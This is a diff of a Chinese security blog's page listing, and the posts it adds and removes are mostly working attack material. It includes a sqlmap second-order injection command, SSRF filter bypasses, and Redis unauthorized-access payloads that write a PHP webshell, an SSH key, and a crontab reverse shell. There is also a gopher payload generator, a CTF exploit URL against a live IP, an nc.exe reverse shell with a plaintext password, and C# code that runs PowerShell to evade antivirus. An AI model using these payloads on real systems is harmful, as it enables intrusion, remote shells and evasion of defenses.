+post包中密码需要和tamper脚本中一致
+去掉login.req中的cookie那一行
+使用代理的话需要开启Burpsuit
+
+这里就直接贴最终的paylaod吧：
+sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast####需要–no-cast 参数
+0x06、总结：主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的
+对于案例二的话应该各位表哥都玩过，所以这里着重点就是案例三中如何使用SQLMAP对二次注入进行数据查询的问题；所以这里我除了上边案例中的源码，我还另外给出了一份二次注入回显型的源码；如果各位表哥有其他更好的思路也欢迎留言
+参考链接：
+http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/
+http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html
+https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="SSRF+Redis" alt="SSRF+Redis" href="/2020/05/19/SSRF-Redis/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="SSRF+Redis" alt="SSRF+Redis"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; SSRF+Redis &gt;</div>
+                            <div class="content flex1">
+                                
+  猪猪侠SSRF议题
+形成SSRF的代码示例：
+&lt;?php
+function curl($url){  
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
+}
+$url = $_GET[&apos;url&apos;];
+curl($url);
+?&gt;SSRF绕过限制：
+利用短网址
+
+xip.io  –&gt; 127.0.0.1.xip.io
+
+@符号绕过 –&gt; www.baidu.com@127.0.0.1 —&gt;访问127.0.0.1（利用解析问题绕过）
+
+dns rebinding ： http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/
+
+更改ip地址写法，如十六进制 http://127.0.0.1 —&gt;http://0177.0.0.1
+
+协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）
+ 
+
+
+
+Redis未授权绝对路径写webshell：
+flushall
+set 1 ‘‘ 
+config set dir /var/www/html
+config set dbfilename shell.php
+save
+
+写ssh公钥：
+ssh-keygen -t rsa ###生成公钥
+flushall
+set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=
+config set dir /root/.ssh/
+config set dbfilename authorized_keys
+save
+
+写contrab定时任务反弹shell：
+
+flushall
+set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+
+SSRF+Redis利用
+http、https 内网服务探测
+file-读取文本
+file:///etc/passwd
+….
+dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）
+
+dict://127.0.0.1:6379/infodict://127.0.0.1:6379/getuserdict://127.0.0.1:6379/flushall
+gopher 万能协议反弹shell：(redis利用需要REST编码)
+Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码转换Redis RESP格式脚本https://xz.aliyun.com/t/5665#toc-4根据需求更改payload、filename、path的值
+import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;127.0.0.1&quot;
+port=&quot;6379&quot;
+payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+ &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+ &quot;config set dir {}&quot;.format(path),
+ &quot;config set dbfilename {}&quot;.format(filename),
+ &quot;save&quot;
+ ]
+if passwd:
+cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+CRLF=&quot;\r\n&quot;
+redis_arr = arr.split(&quot; &quot;)
+cmd=&quot;&quot;
+cmd+=&quot;*&quot;+str(len(redis_arr))
+for x in redis_arr:
+cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+cmd+=CRLF
+return cmd
+if __name__==&quot;__main__&quot;:
+for x in cmd:
+payload += urllib.quote(redis_format(x))
+print payloadubuntu无法写crontab反弹shell： https://xz.aliyun.com/t/1800
+
+SSRF利用redis之不换行
+FLUSHALL
+config set dir /var/www/html/
+set a1 ZY%16%0E%16F
+set a2 ffffff
+BITOP XOR payload a1 a2
+append payload eval($_GET[c]);%3f&gt;
+config set dbfilename cmd.php
+save
+
+Gopher有如下几点问题
+
+PHP的curl默认不跟随302跳转
+curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
+file_get_contents()的SSRF，gopher协议不能使用URLencode
+file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败
+
+SSRF 打内网之POST请求(CTF题目)http://152.136.63.75:8016/index.php?url=    —&gt;存在SSRF
+目录扫描发现 http://152.136.63.75:8016/webshe11231231231.php 页面
+view-source:http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php   —&gt;file读取webshell源码
+&lt;?php
+
+$serverList = array(
+&quot;127.0.0.1&quot;
+);
+$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+foreach ($serverList as $host) {
+if ($ip === $host) {
+if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
+@eval($_POST[&apos;hacker&apos;]);
+} else {
+die(&quot;You aren&apos;t admin!&quot;);
+}
+} else {
+die(&apos;This is webshell&apos;);
+}
+}GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：
+exp = &apos;&apos;&apos;\
+POST /webshe11231231231.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: deflate
+DNT: 1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
+&apos;&apos;&apos;
+import urllib
+tmp = urllib.quote(exp)
+new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
+result = &quot;_&quot;+urllib.quote(new)
+print result更改命令的时候Content-Length的值也需要修改根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”
+
+如上图所示，所以需要两次编码
+生成paylaod：
+kali@kali:~$ python exp.py
+_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A最后exp：
+152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="域渗透之隐藏管理员用户和派生本地管理员" alt="域渗透之隐藏管理员用户和派生本地管理员" href="/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/"
                        class="post-item swiper-slide flex flex-v">
@@ -1193,102 +1861,6 @@ New-PSDrive -name tw -PSProvider FileSystem -Credential $cred -Root \\10.10.14.6
 Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd share:    ##进入共享磁盘
 
 Evil-WinRM* PS share:\&gt; .\winPEAS.exe    ###执行
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="shell中实现runas命令" alt="shell中实现runas命令" href="/2020/04/26/shell%E4%B8%AD%E5%AE%9E%E7%8E%B0runas%E5%91%BD%E4%BB%A4/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="shell中实现runas命令" alt="shell中实现runas命令"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; shell中实现runas命令 &gt;</div>
-                            <div class="content flex1">
-                                
-  有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果
-$pass = convertTo-SecureString &apos;36mEAhz/B8xQ~2VM&apos; -AsPlainText -Force                     
-$cred= New-Object System.Management.Automation.PSCredential(&quot;Sniper\Chris&quot;,$pass)
-Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
-Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
-Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  6636 -e cmd.exe } -Credential $cred  ##反弹shell
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="C#底层调用powershell过杀软" alt="C#底层调用powershell过杀软" href="/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="C#底层调用powershell过杀软" alt="C#底层调用powershell过杀软"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; C#底层调用powershell过杀软 &gt;</div>
-                            <div class="content flex1">
-                                
-  这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。
-国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用
-从C#中调用
-添加运行powershell需要的程序包：
-C#调用powershell安装system.management.automation.dll：
-管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可
-using System;
- using System.Configuration.Install;
- using System.Runtime.InteropServices;
- using System.Management.Automation.Runspaces;
- public class Program
- {
- public static void Main()
- {
- }
- }
- [System.ComponentModel.RunInstaller(true)]
- public class Sample : System.Configuration.Install.Installer
- {
- public override void Uninstall(System.Collections.IDictionary savedState)
- {
- Mycode.Exec();
- }
- }
- public class Mycode
- {
- public static void Exec()
- {
- string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;);
- RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
- Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
- rspace.Open();
- Pipeline pipeline = rspace.CreatePipeline();
- pipeline.Commands.AddScript(command);
- pipeline.Invoke();
- }
- }PS1文件需要适当混淆以过静态查杀
-
 
 
                             </div>
